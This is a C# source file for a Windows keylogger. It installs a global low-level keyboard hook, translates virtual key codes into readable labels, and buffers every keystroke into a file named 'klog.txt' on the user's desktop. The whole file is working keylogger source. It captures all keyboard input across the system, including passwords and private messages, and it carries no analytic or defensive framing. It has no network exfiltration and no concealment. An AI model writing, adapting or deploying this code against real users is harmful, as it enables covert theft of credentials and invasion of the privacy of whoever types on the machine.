using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;
using Windows.Win32.Foundation;

#pragma warning disable CA1416
public class Program
{
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
    private static readonly List<string> Buffer = new();
    private static StreamWriter _writer = new(PathToFile);
    private const uint BufferSize = 10;

    public static unsafe void Main()
    {
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
        
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
        
        _kbHook.Close();
        _writer.Flush();
        _writer.Dispose();
    }

    private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
        
        if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        string stringToWrite;
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
        // their code
        switch (kbStruct->vkCode)
        {
            case 0x08:
                stringToWrite = " [BACKSPACE] ";
                break;
            case 0x09:
                stringToWrite = " [TAB] ";
                break;
            case 0x0C:
                stringToWrite = " [CLEAR] ";
                break;
            case 0x0D:
                stringToWrite = " [ENTER] ";
                break;
            case 0x10:
                stringToWrite = " [SHIFT] ";
                break;
            case 0x11:
                stringToWrite = " [CTRL] ";
                break;
            case 0x12:
                stringToWrite = " [ALT] ";
                break;
            case 0x13:
                stringToWrite = " [PAUSE] ";
                break;
            case 0x14:
                stringToWrite = " [CAPS LOCK] ";
                break;
            case 0x15:
                stringToWrite = " [IME Kana/Hangul mode] ";
                break;
            case 0x17:
                stringToWrite = " [IME On] ";
                break;
            case 0x18:
                stringToWrite = " [IME final mode] ";
                break;
            case 0x19:
                stringToWrite = " [IME Hanja/Kanji mode] ";
                break;
            case 0x1A:
                stringToWrite = " [IME Off] ";
                break;
            case 0x1B:
                stringToWrite = " [ESCAPE] ";
                break;
            case 0x1C:
                stringToWrite = " [IME convert] ";
                break;
            case 0x1D:
                stringToWrite = " [IME nonconvert] ";
                break;
            case 0x1E:
                stringToWrite = " [IME accept] ";
                break;
            case 0x1F:
                stringToWrite = " [IME mode change request] ";
                break;
            case 0x20:
                stringToWrite = " [SPACE] ";
                break;
            case 0x21:
                stringToWrite = " [PAGE UP] ";
                break;
            case 0x22:
                stringToWrite = " [PAGE DOWN] ";
                break;
            case 0x23:
                stringToWrite = " [END] ";
                break;
            case 0x24:
                stringToWrite = " [HOME] ";
                break;
            case 0x25:
                stringToWrite = " [LEFT ARROW] ";
                break;
            case 0x26:
                stringToWrite = " [UP ARROW] ";
                break;
            case 0x27:
                stringToWrite = " [RIGHT ARROW] ";
                break;
            case 0x28:
                stringToWrite = " [DOWN ARROW] ";
                break;
            case 0x29:
                stringToWrite = " [SELECT] ";
                break;
            case 0x2A:
                stringToWrite = " [PRINT] ";
                break;
            case 0x2B:
                stringToWrite = " [EXECUTE] ";
                break;
            case 0x2C:
                stringToWrite = " [PRINT SCREEN] ";
                break;
            case 0x2D:
                stringToWrite = " [INSERT] ";
                break;
            case 0x2E:
                stringToWrite = " [DELETE] ";
                break;
            case 0x2F:
                stringToWrite = " [HELP] ";
                break;
            case 0x30:
                stringToWrite = "0";
                break;
            case 0x31:
                stringToWrite = "1";
                break;
            case 0x32:
                stringToWrite = "2";
                break;
            case 0x33:
                stringToWrite = "3";
                break;
            case 0x34:
                stringToWrite = "4";
                break;
            case 0x35:
                stringToWrite = "5";
                break;
            case 0x36:
                stringToWrite = "6";
                break;
            case 0x37:
                stringToWrite = "7";
                break;
            case 0x38:
                stringToWrite = "8";
                break;
            case 0x39:
                stringToWrite = "9";
                break;
            case 0x41:
                stringToWrite = "A";
                break;
            case 0x42:
                stringToWrite = "B";
                break;
            case 0x43:
                stringToWrite = "C";
                break;
            case 0x44:
                stringToWrite = "D";
                break;
            case 0x45:
                stringToWrite = "E";
                break;
            case 0x46:
                stringToWrite = "F";
                break;
            case 0x47:
                stringToWrite = "G";
                break;
            case 0x48:
                stringToWrite = "H";
                break;
            case 0x49:
                stringToWrite = "I";
                break;
            case 0x4A:
                stringToWrite = "J";
                break;
            case 0x4B:
                stringToWrite = "K";
                break;
            case 0x4C:
                stringToWrite = "L";
                break;
            case 0x4D:
                stringToWrite = "M";
                break;
            case 0x4E:
                stringToWrite = "N";
                break;
            case 0x4F:
                stringToWrite = "O";
                break;
            case 0x50:
                stringToWrite = "P";
                break;
            case 0x51:
                stringToWrite = "Q";
                break;
            case 0x52:
                stringToWrite = "R";
                break;
            case 0x53:
                stringToWrite = "S";
                break;
            case 0x54:
                stringToWrite = "T";
                break;
            case 0x55:
                stringToWrite = "U";
                break;
            case 0x56:
                stringToWrite = "V";
                break;
            case 0x57:
                stringToWrite = "W";
                break;
            case 0x58:
                stringToWrite = "X";
                break;
            case 0x59:
                stringToWrite = "Y";
                break;
            case 0x5A:
                stringToWrite = "Z";
                break;
            case 0x5B:
                stringToWrite = " [LEFT WINDOWS KEY] ";
                break;
            case 0x5C:
                stringToWrite = " [RIGHT WINDOWS KEY] ";
                break;
            case 0x5D:
                stringToWrite = " [APPLICATIONS KEY] ";
                break;
            case 0x5F:
                stringToWrite = " [SLEEP] ";
                break;
            case 0x60:
                stringToWrite = "[NUMPAD 0]";
                break;
            case 0x61:
                stringToWrite = "[NUMPAD 1]";
                break;
            case 0x62:
                stringToWrite = "[NUMPAD 2]";
                break;
            case 0x63:
                stringToWrite = "[NUMPAD 3]";
                break;
            case 0x64:
                stringToWrite = "[NUMPAD 4]";
                break;
            case 0x65:
                stringToWrite = "[NUMPAD 5]";
                break;
            case 0x66:
                stringToWrite = "[NUMPAD 6]";
                break;
            case 0x67:
                stringToWrite = "[NUMPAD 7]";
                break;
            case 0x68:
                stringToWrite = "[NUMPAD 8]";
                break;
            case 0x69:
                stringToWrite = "[NUMPAD 9]";
                break;
            case 0x6A:
                stringToWrite = " [MULTIPLY] ";
                break;
            case 0x6B:
                stringToWrite = " [ADD] ";
                break;
            case 0x6C:
                stringToWrite = " [SEPARATOR] ";
                break;
            case 0x6D:
                stringToWrite = " [SUBTRACT] ";
                break;
            case 0x6E:
                stringToWrite = " [DECIMAL] ";
                break;
            case 0x6F:
                stringToWrite = " [DIVIDE] ";
                break;
            case 0x70:
                stringToWrite = " [F1] ";
                break;
            case 0x71:
                stringToWrite = " [F2] ";
                break;
            case 0x72:
                stringToWrite = " [F3] ";
                break;
            case 0x73:
                stringToWrite = " [F4] ";
                break;
            case 0x74:
                stringToWrite = " [F5] ";
                break;
            case 0x75:
                stringToWrite = " [F6] ";
                break;
            case 0x76:
                stringToWrite = " [F7] ";
                break;
            case 0x77:
                stringToWrite = " [F8] ";
                break;
            case 0x78:
                stringToWrite = " [F9] ";
                break;
            case 0x79:
                stringToWrite = " [F10] ";
                break;
            case 0x7A:
                stringToWrite = " [F11] ";
                break;
            case 0x7B:
                stringToWrite = " [F12] ";
                break;
            case 0x7C:
                stringToWrite = " [F13] ";
                break;
            case 0x7D:
                stringToWrite = " [F14] ";
                break;
            case 0x7E:
                stringToWrite = " [F15] ";
                break;
            case 0x7F:
                stringToWrite = " [F16] ";
                break;
            case 0x80:
                stringToWrite = " [F17] ";
                break;
            case 0x81:
                stringToWrite = " [F18] ";
                break;
            case 0x82:
                stringToWrite = " [F19] ";
                break;
            case 0x83:
                stringToWrite = " [F20] ";
                break;
            case 0x84:
                stringToWrite = " [F21] ";
                break;
            case 0x85:
                stringToWrite = " [F22] ";
                break;
            case 0x86:
                stringToWrite = " [F23] ";
                break;
            case 0x87:
                stringToWrite = " [F24] ";
                break;
            case 0x90:
                stringToWrite = " [NUM LOCK] ";
                break;
            case 0x91:
                stringToWrite = " [SCROLL LOCK] ";
                break;
            case 0xA0:
                stringToWrite = " [LEFT SHIFT] ";
                break;
            case 0xA1:
                stringToWrite = " [RIGHT SHIFT] ";
                break;
            case 0xA2:
                stringToWrite = " [LEFT CONTROL] ";
                break;
            case 0xA3:
                stringToWrite = " [RIGHT CONTROL] ";
                break;
            case 0xA4:
                stringToWrite = " [LEFT ALT] ";
                break;
            case 0xA5:
                stringToWrite = " [RIGHT ALT] ";
                break;
            case 0xA6:
                stringToWrite = " [BROWSER BACK] ";
                break;
            case 0xA7:
                stringToWrite = " [BROWSER FORWARD] ";
                break;
            case 0xA8:
                stringToWrite = " [BROWSER REFRESH] ";
                break;
            case 0xA9:
                stringToWrite = " [BROWSER STOP] ";
                break;
            case 0xAA:
                stringToWrite = " [BROWSER SEARCH] ";
                break;
            case 0xAB:
                stringToWrite = " [BROWSER FAVOURITES] ";
                break;
            case 0xAC:
                stringToWrite = " [BROWSER START/HOME] ";
                break;
            case 0xAD:
                stringToWrite = " [VOLUME MUTE] ";
                break;
            case 0xAE:
                stringToWrite = " [VOLUME DOWN] ";
                break;
            case 0xAF:
                stringToWrite = " [VOLUME UP] ";
                break;
            case 0xB0:
                stringToWrite = " [NEXT TRACK] ";
                break;
            case 0xB1:
                stringToWrite = " [PREVIOUS TRACK] ";
                break;
            case 0xB2:
                stringToWrite = " [STOP MEDIA] ";
                break;
            case 0xB3:
                stringToWrite = " [PLAY/PAUSE MEDIA] ";
                break;
            case 0xB4:
                stringToWrite = " [START MAIL] ";
                break;
            case 0xB5:
                stringToWrite = " [SELECT MEDIA] ";
                break;
            case 0xB6:
                stringToWrite = " [START APPLICATION 1] ";
                break;
            case 0xB7:
                stringToWrite = " [START APPLICATION 2] ";
                break;
            default:
                stringToWrite = $"[CODE {kbStruct->vkCode.ToString()}]";
                break;
        }

        WriteToFile(stringToWrite);
        
        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    private static async void WriteToFile(string stringToWrite)
    {
        if (Buffer.Count >= BufferSize)
        {
            try
            {
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (ObjectDisposedException)
            {
                _writer = new StreamWriter(PathToFile);
                await WriteBuffer();
                await _writer.FlushAsync();
            }
            catch (InvalidOperationException)
            {
                Thread.Sleep(1000);
                await WriteBuffer();
                await _writer.FlushAsync();
            }
        }
        Buffer.Add(stringToWrite);
    }

    private static async Task WriteBuffer()
    {
        foreach (var str in Buffer)
        {
            await _writer.WriteAsync(str);
        }
        Buffer.Clear();
    }
}